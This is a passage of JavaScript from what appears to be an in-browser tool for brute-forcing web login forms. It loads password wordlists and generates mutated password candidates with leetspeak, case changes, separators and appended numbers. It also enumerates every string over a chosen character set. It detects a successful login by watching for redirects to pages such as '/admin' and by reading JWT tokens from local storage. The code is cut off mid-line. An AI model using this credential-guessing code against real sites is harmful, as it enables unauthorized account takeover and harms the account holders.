                            const totalSeconds = elapsedSeconds + remainingSeconds;
                            
                            timeRemaining.textContent = formatTime(remainingSeconds);
                            timeTotal.textContent = formatTime(totalSeconds);
                        }
                    }
                    
                    lastUpdateTime = now;
                }
            };
            
            // Helper function to update word progress (for variations method)
            const updateWordProgress = (method) => {
                const variationsProgress = document.getElementById('variations-progress');
                
                if (method === 'variations' && window.wordTrackingData && variationsProgress) {
                    variationsProgress.style.display = 'block';
                    
                    const data = window.wordTrackingData;
                    const currentWord = data.basePhrases[data.currentWordIndex] || 'Unknown';
                    const completed = data.currentWordIndex;
                    const remaining = data.totalWords - data.currentWordIndex - 1;
                    const wordProgress = data.totalWords > 0 ? (completed / data.totalWords) * 100 : 0;
                    
                    // Update current word
                    document.getElementById('current-base-word').textContent = currentWord;
                    
                    // Update counts
                    document.getElementById('completed-words').textContent = completed;
                    document.getElementById('remaining-words').textContent = remaining;
                    
                    // Update progress bar
                    document.getElementById('word-progress-bar').style.width = wordProgress + '%';
                    
                    // Update word list with status
                    const wordsStatus = document.getElementById('words-status');
                    if (wordsStatus) {
                        const statusHtml = data.basePhrases.map((word, index) => {
                            let status = '';
                            let color = '#666';
                            
                            if (index < data.currentWordIndex) {
                                status = '✓ Done';
                                color = '#4CAF50';
                            } else if (index === data.currentWordIndex) {
                                status = '→ Current';
                                color = '#FFC107';
                            } else {
                                status = '○ Pending';
                                color = '#666';
                            }
                            
                            return `<div style="color: ${color}; margin: 1px 0;">${status} ${word}</div>`;
                        }).join('');
                        
                        wordsStatus.innerHTML = statusHtml;
                    }
                    
                    // Update the multiple phrases textarea with progress indicators
                    updateMultiplePhraseTextarea(data);
                } else {
                    if (variationsProgress) {
                        variationsProgress.style.display = 'none';
                    }
                }
            };
            
            // Helper function to update multiple phrases textarea with progress indicators
            const updateMultiplePhraseTextarea = (data) => {
                const textarea = document.getElementById('multiple-phrases-input');
                if (!textarea || !data) return;
                
                // Save current cursor position
                const cursorPos = textarea.selectionStart;
                
                // Update textarea content with progress indicators
                const updatedContent = data.basePhrases.map((word, index) => {
                    if (index < data.currentWordIndex) {
                        return `✓ ${word}`;
                    } else if (index === data.currentWordIndex) {
                        return `-> ${word}`;
                    } else {
                        return `   ${word}`;
                    }
                }).join('\n');
                
                textarea.value = updatedContent;
                
                // Restore cursor position (adjust for added characters)
                textarea.setSelectionRange(cursorPos, cursorPos);
            };

            // Toggle between password sources
            document.getElementById('password-source').addEventListener('change', function () {
                const source = this.value;
                document.getElementById('local-file-section').style.display = source === 'local' ? 'block' : 'none';
                document.getElementById('manual-entry-section').style.display = source === 'manual' ? 'block' : 'none';
            });

            // File upload functionality
            document.getElementById('load-password-file').addEventListener('click', function () {
                const fileInput = document.getElementById('password-file');
                const file = fileInput.files[0];

                if (!file) {
                    updateStatus('Error: No file selected!', true);
                    return;
                }

                const reader = new FileReader();

                reader.onload = function (e) {
                    const content = e.target.result;
                    passwords = content.split(/\r?\n/).filter(line => line.trim() !== '');

                    document.getElementById('file-info').style.display = 'block';
                    document.getElementById('file-name').textContent = file.name;
                    document.getElementById('password-count').textContent = passwords.length;

                    updateStatus(`Password list loaded: ${passwords.length} passwords from ${file.name}`, false);
                };

                reader.onerror = function () {
                    updateStatus('Error reading file!', true);
                };

                reader.readAsText(file);
            });

            // Add multiple phrases functionality
            const addMultiplePhrases = document.getElementById('add-multiple-phrases');
            const multiplePhraseSection = document.getElementById('multiple-phrases-section');
            const multiplePhraseInput = document.getElementById('multiple-phrases-input');
            const multiplePhraseOk = document.getElementById('multiple-phrases-ok');
            const multiplePhraseCancel = document.getElementById('multiple-phrases-cancel');
            
            if (addMultiplePhrases) {
                addMultiplePhrases.addEventListener('click', function () {
                    multiplePhraseSection.style.display = 'block';
                    multiplePhraseInput.focus();
                });
            }
            
            if (multiplePhraseCancel) {
                multiplePhraseCancel.addEventListener('click', function () {
                    multiplePhraseSection.style.display = 'none';
                    // Don't clear the input - keep the entries for progress tracking
                });
            }
            
            // Ctrl/Cmd+Enter shortcut for multiple phrases
            if (multiplePhraseInput) {
                multiplePhraseInput.addEventListener('keydown', function (e) {
                    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                        e.preventDefault();
                        multiplePhraseOk.click();
                    }
                });
            }
            
            if (multiplePhraseOk) {
                multiplePhraseOk.addEventListener('click', function () {
                    const rawPhrases = multiplePhraseInput.value.trim().split('\n').filter(p => p.trim());
                    if (rawPhrases.length === 0) {
                        updateStatus('Error: Please enter at least one phrase!', true);
                        return;
                    }
                    
                    // Clean phrases by removing progress indicators
                    const phrases = rawPhrases.map(phrase => {
                        // Remove progress indicators: ✓, ->, and leading spaces
                        return phrase.replace(/^(✓|->|\s+)/, '').trim();
                    }).filter(p => p.length > 0);
                    
                    if (phrases.length === 0) {
                        updateStatus('Error: No valid phrases found!', true);
                        return;
                    }
                    
                    // Store phrases for brute force
                    window.multiplePhrases = phrases;
                    multiplePhraseSection.style.display = 'none';
                    
                    // Update single phrase field to show first phrase
                    document.getElementById('base-phrase').value = phrases[0];
                    updateStatus(`Loaded ${phrases.length} base phrases`, false);
                });
            }

            // Preview variations button
            const previewButton = document.getElementById('preview-variations');
            if (previewButton) {
                previewButton.addEventListener('click', function () {
                    const container = document.getElementById('variations-preview-container');
                    const toggleText = document.getElementById('preview-toggle-text');
                    
                    if (container.style.display === 'none') {
                        container.style.display = 'block';
                        toggleText.textContent = '▲ Hide Variations Preview';
                    } else {
                        container.style.display = 'none';
                        toggleText.textContent = '▼ Show Variations Preview';
                    }
                });
            }
            
            // Show all variations button
            const showAllVariationsButton = document.getElementById('show-all-variations');
            if (showAllVariationsButton) {
                showAllVariationsButton.addEventListener('click', function () {
                    showVariationsPreview('all');
                });
            }
            
            // Show random sample button
            const showRandomSampleButton = document.getElementById('show-random-sample');
            if (showRandomSampleButton) {
                showRandomSampleButton.addEventListener('click', function () {
                    showVariationsPreview('random');
                });
            }
            
            // Function to show variations preview
            const showVariationsPreview = (mode) => {
                let basePhrases = [];
                
                // Check if we have multiple phrases or single phrase
                if (window.multiplePhrases && window.multiplePhrases.length > 0) {
                    basePhrases = window.multiplePhrases;
                } else {
                    const basePhrase = document.getElementById('base-phrase').value.trim();
                    if (!basePhrase) {
                        document.getElementById('variations-preview').innerHTML = '<div style="color: #ff9999;">Please enter a base phrase first!</div>';
                        return;
                    }
                    basePhrases = [basePhrase];
                }
                
                const options = {
                    useLeetspeak: document.getElementById('use-leetspeak').checked,
                    useSeparators: document.getElementById('use-separators').checked,
                    useCapitalization: document.getElementById('use-capitalization').checked,
                    rushMode: document.getElementById('rush-mode').checked
                };
                
                let allVariations = new Set();
                basePhrases.forEach(phrase => {
                    const variations = generateAllVariations(phrase, options);
                    variations.forEach(v => allVariations.add(v));
                });
                
                const finalVariations = Array.from(allVariations);
                const previewDiv = document.getElementById('variations-preview');
                
                if (finalVariations.length === 0) {
                    previewDiv.innerHTML = '<div style="color: #ff9999;">No variations generated!</div>';
                    return;
                }
                
                let displayVariations = [];
                let headerText = '';
                
                if (mode === 'all') {
                    displayVariations = finalVariations.slice(0, 200);
                    headerText = `<div style="margin-bottom: 8px; color: #4a6ed3; font-weight: bold;">Generated ${finalVariations.length} variations from ${basePhrases.length} base phrase(s):</div>`;
                } else if (mode === 'random') {
                    // Get random sample
                    const sampleSize = Math.min(50, finalVariations.length);
                    displayVariations = [];
                    const used = new Set();
                    
                    while (displayVariations.length < sampleSize) {
                        const randomIndex = Math.floor(Math.random() * finalVariations.length);
                        if (!used.has(randomIndex)) {
                            used.add(randomIndex);
                            displayVariations.push(finalVariations[randomIndex]);
                        }
                    }
                    
                    headerText = `<div style="margin-bottom: 8px; color: #6ed34a; font-weight: bold;">Random sample of ${sampleSize} variations (from ${finalVariations.length} total):</div>`;
                }
                
                let previewHtml = headerText;
                previewHtml += displayVariations.map(v => `<div style="margin: 2px 0; padding: 2px 4px; background-color: rgba(255,255,255,0.1); border-radius: 3px;">${v}</div>`).join('');
                
                if (mode === 'all' && finalVariations.length > 200) {
                    previewHtml += `<div style="margin-top: 8px; color: #aaa; font-style: italic;">... and ${finalVariations.length - 200} more variations</div>`;
                }
                
                previewDiv.innerHTML = previewHtml;
                updateStatus(`Generated ${finalVariations.length} variations from ${basePhrases.length} base phrase(s)`, false);
            };

            // Leetspeak mapping (full)
            const leetSpeakMap = {
                'a': ['4', '@'], 'A': ['4', '@'],
                'b': ['8'], 'B': ['8'],
                'c': ['('], 'C': ['('],
                'e': ['3', '€'], 'E': ['3', '€'],
                'g': ['9', '6'], 'G': ['9', '6'],
                'h': ['#'], 'H': ['#'],
                'i': ['1', '!', '|'], 'I': ['1', '!', '|'],
                'l': ['1'], 'L': ['1'],
                'o': ['0', '()'], 'O': ['0', '()'],
                's': ['5', '$'], 'S': ['5', '$'],
                't': ['7'], 'T': ['7'],
                'z': ['2'], 'Z': ['2']
            };
            
            // Leetspeak mapping (rush mode - most common only)
            const leetSpeakMapRush = {
                'a': ['4'], 'A': ['4'],
                'e': ['3'], 'E': ['3'],
                'i': ['1'], 'I': ['1'],
                'o': ['0'], 'O': ['0'],
                's': ['5'], 'S': ['5'],
                't': ['7'], 'T': ['7'],
                'l': ['1'], 'L': ['1']
            };

            // Generate leetspeak variations
            const generateLeetSpeakVariations = (word, rushMode = false) => {
                const variations = new Set([word]);
                const mapToUse = rushMode ? leetSpeakMapRush : leetSpeakMap;
                
                const generateVariation = (current, index) => {
                    if (index >= current.length) {
                        variations.add(current);
                        return;
                    }
                    
                    const char = current[index];
                    generateVariation(current, index + 1);
                    
                    if (mapToUse[char]) {
                        for (const replacement of mapToUse[char]) {
                            const newWord = current.slice(0, index) + replacement + current.slice(index + 1);
                            generateVariation(newWord, index + 1);
                        }
                    }
                };
                
                generateVariation(word, 0);
                return Array.from(variations);
            };

            // Generate capitalization variations
            const generateCapitalizationVariations = (word, rushMode = false) => {
                const variations = new Set();
                
                // All lowercase (always include)
                variations.add(word.toLowerCase());
                
                // All uppercase (always include)
                variations.add(word.toUpperCase());
                
                // First letter capitalized (always include)
                variations.add(word.charAt(0).toUpperCase() + word.slice(1).toLowerCase());
                
                // Title case (capitalize first letter of each word part) - always include
                // Use more robust pattern to handle spaces after punctuation
                const titleCase = word.replace(/(?:^|\s+|[.!?]+\s*)(\w)/g, (match, letter) => {
                    return match.slice(0, -1) + letter.toUpperCase();
                });
                variations.add(titleCase);
                
                if (!rushMode) {
                    
                    // Camel case variations
                    const parts = word.split(/[\s._-]/);
                    if (parts.length > 1) {
                        // camelCase
                        const camelCase = parts[0].toLowerCase() + parts.slice(1).map(p => 
                            p.charAt(0).toUpperCase() + p.slice(1).toLowerCase()
                        ).join('');
                        variations.add(camelCase);
                        
                        // PascalCase
                        const pascalCase = parts.map(p => 
                            p.charAt(0).toUpperCase() + p.slice(1).toLowerCase()
                        ).join('');
                        variations.add(pascalCase);
                    }
                    
                    // Random capitalization patterns
                    const randomPatterns = [
                        word => word.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join(''),
                        word => word.split('').map((c, i) => i % 2 === 1 ? c.toLowerCase() : c.toUpperCase()).join('')
                    ];
                    
                    randomPatterns.forEach(pattern => variations.add(pattern(word)));
                }
                
                return Array.from(variations);
            };

            // Generate separator variations
            const generateSpaceSubstitutions = (phrase) => {
                const variations = new Set();
                variations.add(phrase); // Add original
                
                // Simple substitutions
                if (phrase.includes(' ')) {
                    variations.add(phrase.replace(/ /g, '.'));
                }
                
                if (phrase.includes('.')) {
                    variations.add(phrase.replace(/\./g, ' '));
                }
                
                // Advanced substitutions - create all combinations
                const chars = phrase.split('');
                const spaceIndices = [];
                const dotIndices = [];
                
                // Find all space and dot positions
                chars.forEach((char, index) => {
                    if (char === ' ') spaceIndices.push(index);
                    if (char === '.') dotIndices.push(index);
                });
                
                // Generate variations with double dots and spaces
                if (spaceIndices.length > 0) {
                    // Double spaces
                    spaceIndices.forEach(index => {
                        const variant = [...chars];
                        variant[index] = '  '; // Double space
                        variations.add(variant.join(''));
                    });
                    
                    // Space to double dot
                    spaceIndices.forEach(index => {
                        const variant = [...chars];
                        variant[index] = '..'; // Double dot
                        variations.add(variant.join(''));
                    });
                }
                
                if (dotIndices.length > 0) {
                    // Double dots
                    dotIndices.forEach(index => {
                        const variant = [...chars];
                        variant[index] = '..'; // Double dot
                        variations.add(variant.join(''));
                    });
                    
                    // Dot to double space
                    dotIndices.forEach(index => {
                        const variant = [...chars];
                        variant[index] = '  '; // Double space
                        variations.add(variant.join(''));
                    });
                }
                
                // Mixed combinations (space + dot)
                if (spaceIndices.length > 0) {
                    spaceIndices.forEach(index => {
                        const variant = [...chars];
                        variant[index] = ' .'; // Space + dot
                        variations.add(variant.join(''));
                        
                        const variant2 = [...chars];
                        variant2[index] = '. '; // Dot + space
                        variations.add(variant2.join(''));
                    });
                }
                
                if (dotIndices.length > 0) {
                    dotIndices.forEach(index => {
                        const variant = [...chars];
                        variant[index] = ' .'; // Space + dot
                        variations.add(variant.join(''));
                        
                        const variant2 = [...chars];
                        variant2[index] = '. '; // Dot + space
                        variations.add(variant2.join(''));
                    });
                }
                
                // Complete swapping for mixed phrases
                if (phrase.includes(' ') && phrase.includes('.')) {
                    let variant1 = phrase.replace(/ /g, '|TEMP|').replace(/\./g, ' ').replace(/\|TEMP\|/g, '.');
                    variations.add(variant1);
                }
                
                return Array.from(variations);
            };

            // Generate variations with spaces around punctuation
            const generateSpaceAroundPunctuationVariations = (phrase, rushMode = false) => {
                const variations = new Set();
                variations.add(phrase); // Add original
                
                // Common punctuation marks to work with
                const punctuationMarks = ['.', ',', '!', '?', ':', ';', '-', '_'];
                
                punctuationMarks.forEach(punct => {
                    if (phrase.includes(punct)) {
                        // First, normalize the phrase by removing existing spaces around punctuation
                        const normalizedPhrase = phrase.replace(new RegExp(`\\s*\\${punct}\\s*`, 'g'), punct);
                        
                        // Add space before punctuation
                        const spaceBefore = normalizedPhrase.replace(new RegExp(`\\${punct}`, 'g'), ` ${punct}`);
                        variations.add(spaceBefore);
                        
                        // Add space after punctuation
                        const spaceAfter = normalizedPhrase.replace(new RegExp(`\\${punct}`, 'g'), `${punct} `);
                        variations.add(spaceAfter);
                        
                        // Add spaces both before and after punctuation
                        const spaceBoth = normalizedPhrase.replace(new RegExp(`\\${punct}`, 'g'), ` ${punct} `);
                        variations.add(spaceBoth);
                        
                        if (!rushMode) {
                            // Double spaces before
                            const doubleSpaceBefore = normalizedPhrase.replace(new RegExp(`\\${punct}`, 'g'), `  ${punct}`);
                            variations.add(doubleSpaceBefore);
                            
                            // Double spaces after
                            const doubleSpaceAfter = normalizedPhrase.replace(new RegExp(`\\${punct}`, 'g'), `${punct}  `);
                            variations.add(doubleSpaceAfter);
                            
                            // Tab-like spacing (4 spaces)
                            const tabBefore = normalizedPhrase.replace(new RegExp(`\\${punct}`, 'g'), `    ${punct}`);
                            variations.add(tabBefore);
                            
                            const tabAfter = normalizedPhrase.replace(new RegExp(`\\${punct}`, 'g'), `${punct}    `);
                            variations.add(tabAfter);
                        }
                    }
                });
                
                // Special handling for combinations like ". " -> " .", " .", "  .", etc.
                if (phrase.includes('. ')) {
                    const base = phrase.replace(/\. /g, '.');
                    variations.add(base.replace(/\./g, ' .'));      // "mr .noodles"
                    variations.add(base.replace(/\./g, ' . '));     // "mr . noodles" 
                    if (!rushMode) {
                        variations.add(base.replace(/\./g, '  .'));     // "mr  .noodles"
                        variations.add(base.replace(/\./g, '.  '));     // "mr.  noodles"
                        variations.add(base.replace(/\./g, '  .  '));   // "mr  .  noodles"
                    }
                }
                
                return Array.from(variations);
            };

            const generateSeparatorVariations = (phrase, rushMode = false) => {
                const variations = new Set();
                
                // First, generate space substitutions
                const spaceSubstitutions = generateSpaceSubstitutions(phrase);
                
                // Add space-around-punctuation variations
                const spaceAroundPunctuation = generateSpaceAroundPunctuationVariations(phrase, rushMode);
                spaceAroundPunctuation.forEach(v => variations.add(v));
                
                spaceSubstitutions.forEach(substitutedPhrase => {
                    // Split by common separators (including underscore now)
                    const parts = substitutedPhrase.split(/[\s._\-+~|#@*&%$!:;=]+/);
                
                    if (parts.length > 1) {
                        // No separator (always include)
                        variations.add(parts.join(''));
                        
                        // Common separators (space is high priority)
                        const separators = rushMode 
                            ? ['', ' ', '.', '_', '-'] // Rush mode: space as second priority
                            : ['', ' ', '.', '_', '-', '+', '~', '|', '#', '@', '*', '&', '%', '$', '!', ':', ';', '='];
                        separators.forEach(sep => variations.add(parts.join(sep)));
                        
                        if (!rushMode) {
                            // Mixed separators for more than 2 parts (skip in rush mode)
                            if (parts.length > 2) {
                                variations.add(parts[0] + ' ' + parts.slice(1).join(''));
                                variations.add(parts[0] + '.' + parts.slice(1).join(''));
                                variations.add(parts[0] + '_' + parts.slice(1).join(''));
                                variations.add(parts[0] + '-' + parts.slice(1).join(''));
                                variations.add(parts[0] + parts.slice(1).join(' '));
                                variations.add(parts[0] + parts.slice(1).join('_'));
                                variations.add(parts[0] + parts.slice(1).join('-'));
                            }
                        }
                        
                        // Special number combinations (common in passwords) - always include
                        if (parts.length === 2) {
                            variations.add(parts[0] + '123' + parts[1]);
                            variations.add(parts[0] + parts[1] + '123');
                            if (!rushMode) {
                                variations.add(parts[0] + '1' + parts[1]);
                                variations.add(parts[0] + '01' + parts[1]);
                                variations.add(parts[0] + parts[1] + '1');
                            }
                        }
                    } else {
                        variations.add(substitutedPhrase);
                        
                        // Add number variations even for single words - always include common ones
                        variations.add(substitutedPhrase + '123');
                        if (!rushMode) {
                            variations.add(substitutedPhrase + '1');
                            variations.add(substitutedPhrase + '01');
                            variations.add('123' + substitutedPhrase);
                            variations.add('1' + substitutedPhrase);
                        }
                    }
                });
                
                return Array.from(variations);
            };

            // Generate all variations combining leetspeak, capitalization, and separators
            const generateAllVariations = (basePhrase, options = {useLeetspeak: true, useSeparators: true, useCapitalization: true, rushMode: false}) => {
                const allVariations = new Set();
                
                // First generate separator variations
                const separatorVariations = options.useSeparators ? generateSeparatorVariations(basePhrase, options.rushMode) : [basePhrase];
                
                separatorVariations.forEach(sepVar => {
                    // Then generate capitalization variations
                    const capVariations = options.useCapitalization ? generateCapitalizationVariations(sepVar, options.rushMode) : [sepVar];
                    
                    capVariations.forEach(capVar => {
                        // Add non-leetspeak version
                        allVariations.add(capVar);
                        
                        // Generate leetspeak variations if enabled
                        if (options.useLeetspeak) {
                            const leetVariations = generateLeetSpeakVariations(capVar, options.rushMode);
                            leetVariations.forEach(leetVar => allVariations.add(leetVar));
                        }
                    });
                });
                
                return Array.from(allVariations);
            };
            
            // Create password display overlay
            const createPasswordDisplayOverlay = (allPasswords, basePhrases, wordVariationsMap) => {
                // Remove existing overlay if present
                const existingOverlay = document.getElementById('password-display-overlay');
                if (existingOverlay) {
                    existingOverlay.remove();
                }
                
                // Create overlay container
                const overlay = document.createElement('div');
                overlay.id = 'password-display-overlay';
                overlay.style.cssText = `
                    position: fixed;
                    top: 60px;
                    left: 20px;
                    width: 500px;
                    max-height: 80vh;
                    background-color: #2C2E3B;
                    color: white;
                    border-radius: 8px;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                    font-family: monospace;
                    z-index: 10000;
                    padding: 15px;
                    overflow-y: auto;
                `;
                
                // Create header with close button
                const header = document.createElement('div');
                header.style.cssText = `
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 15px;
                    padding-bottom: 10px;
                    border-bottom: 1px solid #555;
                `;
                
                const title = document.createElement('h3');
                title.textContent = `Generated Passwords (${allPasswords.length.toLocaleString()})`;
                title.style.margin = '0';
                header.appendChild(title);
                
                const closeBtn = document.createElement('button');
                closeBtn.textContent = '×';
                closeBtn.style.cssText = `
                    background: none;
                    border: none;
                    color: white;
                    font-size: 24px;
                    cursor: pointer;
                    padding: 0;
                    width: 30px;
                    height: 30px;
                `;
                closeBtn.onclick = () => overlay.remove();
                header.appendChild(closeBtn);
                
                overlay.appendChild(header);
                
                // Add copy all button
                const copyAllBtn = document.createElement('button');
                copyAllBtn.textContent = 'Copy All Passwords';
                copyAllBtn.style.cssText = `
                    width: 100%;
                    padding: 10px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    margin-bottom: 15px;
                    font-size: 14px;
                `;
                copyAllBtn.onclick = () => {
                    const passwordsText = allPasswords.join('\n');
                    navigator.clipboard.writeText(passwordsText).then(() => {
                        copyAllBtn.textContent = 'Copied!';
                        copyAllBtn.style.backgroundColor = '#689f38';
                        setTimeout(() => {
                            copyAllBtn.textContent = 'Copy All Passwords';
                            copyAllBtn.style.backgroundColor = '#4CAF50';
                        }, 2000);
                    }).catch(err => {
                        console.error('Failed to copy:', err);
                        copyAllBtn.textContent = 'Copy failed!';
                        copyAllBtn.style.backgroundColor = '#d34a4a';
                    });
                };
                overlay.appendChild(copyAllBtn);
                
                // Add search functionality
                const searchContainer = document.createElement('div');
                searchContainer.style.cssText = 'margin-bottom: 15px;';
                
                const searchInput = document.createElement('input');
                searchInput.type = 'text';
                searchInput.placeholder = 'Search passwords...';
                searchInput.style.cssText = `
                    width: 100%;
                    padding: 8px;
                    background-color: #1a1a2e;
                    color: white;
                    border: 1px solid #555;
                    border-radius: 4px;
                    font-family: monospace;
                `;
                searchContainer.appendChild(searchInput);
                overlay.appendChild(searchContainer);
                
                // Create password list container
                const listContainer = document.createElement('div');
                listContainer.style.cssText = `
                    max-height: calc(80vh - 200px);
                    overflow-y: auto;
                    background-color: #1a1a2e;
                    padding: 10px;
                    border-radius: 4px;
                `;
                
                // If word variations map exists, show grouped view
                if (wordVariationsMap && basePhrases) {
                    const groupedView = document.createElement('div');
                    
                    basePhrases.forEach((phrase, index) => {
                        const variations = wordVariationsMap.get(phrase) || [];
                        
                        const phraseHeader = document.createElement('div');
                        phraseHeader.style.cssText = `
                            margin-top: ${index > 0 ? '20px' : '0'};
                            margin-bottom: 10px;
                            padding: 8px;
                            background-color: #252733;
                            border-radius: 4px;
                            font-weight: bold;
                            color: #4CAF50;
                        `;
                        phraseHeader.textContent = `Base: "${phrase}" (${variations.length} variations)`;
                        groupedView.appendChild(phraseHeader);
                        
                        const phraseList = document.createElement('div');
                        phraseList.style.cssText = 'padding-left: 10px;';
                        phraseList.className = 'password-group';
                        
                        variations.forEach((password, idx) => {
                            const passwordItem = document.createElement('div');
                            passwordItem.className = 'password-item';
                            passwordItem.style.cssText = `
                                padding: 4px 8px;
                                margin: 2px 0;
                                background-color: #2C2E3B;
                                border-radius: 3px;
                                cursor: pointer;
                                transition: background-color 0.2s;
                                display: flex;
                                justify-content: space-between;
                                align-items: center;
                            `;
                            passwordItem.onmouseover = () => passwordItem.style.backgroundColor = '#373948';
                            passwordItem.onmouseout = () => passwordItem.style.backgroundColor = '#2C2E3B';
                            
                            const passwordText = document.createElement('span');
                            passwordText.textContent = password;
                            passwordText.style.cssText = 'flex-grow: 1;';
                            passwordItem.appendChild(passwordText);
                            
                            const copyBtn = document.createElement('button');
                            copyBtn.textContent = 'Copy';
                            copyBtn.style.cssText = `
                                padding: 2px 8px;
                                background-color: #4a6ed3;
                                color: white;
                                border: none;
                                border-radius: 3px;
                                cursor: pointer;
                                font-size: 12px;
                            `;
                            copyBtn.onclick = (e) => {
                                e.stopPropagation();
                                navigator.clipboard.writeText(password).then(() => {
                                    copyBtn.textContent = '✓';
                                    setTimeout(() => copyBtn.textContent = 'Copy', 1000);
                                });
                            };
                            passwordItem.appendChild(copyBtn);
                            
                            passwordItem.onclick = () => {
                                navigator.clipboard.writeText(password);
                                passwordItem.style.backgroundColor = '#4CAF50';
                                setTimeout(() => passwordItem.style.backgroundColor = '#2C2E3B', 300);
                            };
                            
                            phraseList.appendChild(passwordItem);
                        });
                        
                        groupedView.appendChild(phraseList);
                    });
                    
                    listContainer.appendChild(groupedView);
                } else {
                    // Simple list view
                    allPasswords.forEach((password, index) => {
                        const passwordItem = document.createElement('div');
                        passwordItem.className = 'password-item';
                        passwordItem.style.cssText = `
                            padding: 4px 8px;
                            margin: 2px 0;
                            background-color: #2C2E3B;
                            border-radius: 3px;
                            cursor: pointer;
                            transition: background-color 0.2s;
                        `;
                        passwordItem.textContent = `${index + 1}. ${password}`;
                        passwordItem.onmouseover = () => passwordItem.style.backgroundColor = '#373948';
                        passwordItem.onmouseout = () => passwordItem.style.backgroundColor = '#2C2E3B';
                        passwordItem.onclick = () => {
                            navigator.clipboard.writeText(password);
                            passwordItem.style.backgroundColor = '#4CAF50';
                            setTimeout(() => passwordItem.style.backgroundColor = '#2C2E3B', 300);
                        };
                        listContainer.appendChild(passwordItem);
                    });
                }
                
                overlay.appendChild(listContainer);
                
                // Search functionality
                searchInput.oninput = () => {
                    const searchTerm = searchInput.value.toLowerCase();
                    const items = listContainer.querySelectorAll('.password-item');
                    const groups = listContainer.querySelectorAll('.password-group');
                    
                    if (groups.length > 0) {
                        // Grouped view search
                        groups.forEach(group => {
                            const groupItems = group.querySelectorAll('.password-item');
                            let hasVisibleItems = false;
                            
                            groupItems.forEach(item => {
                                const text = item.querySelector('span').textContent.toLowerCase();
                                if (text.includes(searchTerm)) {
                                    item.style.display = 'flex';
                                    hasVisibleItems = true;
                                } else {
                                    item.style.display = 'none';
                                }
                            });
                            
                            // Hide group header if no visible items
                            const header = group.previousElementSibling;
                            if (header) {
                                header.style.display = hasVisibleItems ? 'block' : 'none';
                            }
                        });
                    } else {
                        // Simple list search
                        items.forEach(item => {
                            const text = item.textContent.toLowerCase();
                            item.style.display = text.includes(searchTerm) ? 'block' : 'none';
                        });
                    }
                };
                
                // Add drag functionality
                let isDragging = false;
                let offsetX, offsetY;
                
                header.style.cursor = 'move';
                header.addEventListener('mousedown', (e) => {
                    if (e.target === closeBtn) return;
                    isDragging = true;
                    offsetX = e.clientX - overlay.offsetLeft;
                    offsetY = e.clientY - overlay.offsetTop;
                    overlay.style.cursor = 'grabbing';
                });
                
                document.addEventListener('mousemove', (e) => {
                    if (!isDragging) return;
                    overlay.style.left = (e.clientX - offsetX) + 'px';
                    overlay.style.top = (e.clientY - offsetY) + 'px';
                });
                
                document.addEventListener('mouseup', () => {
                    isDragging = false;
                    overlay.style.cursor = 'default';
                });
                
                document.body.appendChild(overlay);
            };

            // Toggle between password list, character set, and variations method
            document.getElementById('bf-method').addEventListener('change', function () {
                const method = this.value;
                document.getElementById('password-list-section').style.display = method === 'list' ? 'block' : 'none';
                document.getElementById('charset-section').style.display = method === 'charset' ? 'block' : 'none';
                document.getElementById('variations-section').style.display = method === 'variations' ? 'block' : 'none';
            });

            // Helper function to generate passwords based on character set
            const generatePasswordsFromCharset = (charset, minLength, maxLength) => {
                const passwords = [];

                // Recursive function to generate all combinations
                const generateCombinations = (currentPassword, length) => {
                    if (length === 0) {
                        passwords.push(currentPassword);
                        return;
                    }

                    for (let i = 0; i < charset.length; i++) {
                        generateCombinations(currentPassword + charset[i], length - 1);
                    }
                };

                // Generate for each length between min and max
                for (let length = minLength; length <= maxLength; length++) {
                    generateCombinations('', length);
                }

                return passwords;
            };

            // Helper function to generate a character set based on user selection
            const buildCharset = () => {
                let charset = '';

                if (document.getElementById('charset-lowercase').checked) {
                    charset += 'abcdefghijklmnopqrstuvwxyz';
                }

                if (document.getElementById('charset-uppercase').checked) {
                    charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                }

                if (document.getElementById('charset-numbers').checked) {
                    charset += '0123456789';
                }

                if (document.getElementById('charset-special').checked) {
                    charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
                }

                const customCharset = document.getElementById('charset-custom').value.trim();
                if (customCharset) {
                    // Deduplicate the character set
                    for (let i = 0; i < customCharset.length; i++) {
                        if (charset.indexOf(customCharset[i]) === -1) {
                            charset += customCharset[i];
                        }
                    }
                }

                return charset;
            };

            // Generator for incremental passwords (for more efficient brute-forcing)
            const createPasswordGenerator = (charset, minLength, maxLength) => {
                let currentLength = minLength;
                let indices = Array(minLength).fill(0);

                return {
                    next: function () {
                        if (currentLength > maxLength) {
                            return {done: true, value: null};
                        }

                        // Generate current password
                        let password = '';
                        for (let i = 0; i < indices.length; i++) {
                            password += charset[indices[i]];
                        }

                        // Increase indices for next password
                        let pos = indices.length - 1;
                        while (pos >= 0) {
                            indices[pos]++;
                            if (indices[pos] < charset.length) {
                                break;
                            }
                            indices[pos] = 0;
                            pos--;
                        }

                        // If we've gone through all combinations for the current length
                        if (pos < 0) {
                            currentLength++;
                            if (currentLength <= maxLength) {
                                indices = Array(currentLength).fill(0);
                            }
                        }

                        return {done: false, value: password};
                    }
                };
            };

            // Helper function to update the info line
            const updateInfoLine = (username, password, status) => {
                const infoLine = document.getElementById('info-line');
                const lastAttempt = document.getElementById('last-attempt');
                const lastAttemptStatus = document.getElementById('last-attempt-status');

                infoLine.style.display = 'block';
                lastAttempt.textContent = `${username} / ${password}`;
                lastAttemptStatus.textContent = status;

                // Set color based on status
                if (status.includes('Success')) {
                    lastAttemptStatus.style.color = '#4CAF50';
                    infoLine.style.backgroundColor = '#1e3323';
                } else if (status.includes('Failed')) {
                    lastAttemptStatus.style.color = '#FF5252';
                } else {
                    lastAttemptStatus.style.color = '#FFC107';
                }
            };

            // Helper function to check for success/failure
            const checkLoginStatus = () => {
                // Check for URL change (common in SPAs)
                const currentUrl = window.location.href;
                if (currentUrl.includes('/search') || currentUrl.includes('/dashboard') || 
                    currentUrl.includes('/profile') || currentUrl.includes('/admin')) {
                    return 'success';
                }

                // Check for JWT token in localStorage/sessionStorage (common in modern apps)
                try {
                    const token = localStorage.getItem('token') || sessionStorage.getItem('token') ||
                                 localStorage.getItem('jwt') || sessionStorage.getItem('jwt') ||
